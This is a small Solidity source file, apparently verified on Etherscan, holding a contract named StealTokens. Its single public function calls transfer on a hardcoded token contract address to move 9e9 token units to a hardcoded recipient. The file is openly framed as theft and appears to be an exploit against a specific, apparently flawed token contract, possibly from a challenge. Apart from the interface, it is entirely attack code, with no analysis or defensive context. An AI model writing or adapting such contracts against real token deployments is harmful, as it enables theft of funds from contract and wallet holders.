/**
 *Submitted for verification at Etherscan.io on 2022-09-07
*/

// File: contracts/TokensContractInterface.sol

pragma solidity >= 0.8.0 < 0.9.0;

interface TokensContractInterface {
  function transfer ( address _to, uint _value ) external returns(bool);
}

// File: contracts/StealTokens.sol

pragma solidity >= 0.8.0 < 0.9.0;


contract StealTokens{

    address tokensContractAddress = 0xC42aC582a0F64f50Bb3AE1Af0AEA592E91A084cB;

    function stealTheTokens() public {
        TokensContractInterface(tokensContractAddress).transfer(0x388eEe10A1EB3Ce516A858A955c5D131BA26E9A1, 9 * 1e9);
    }
}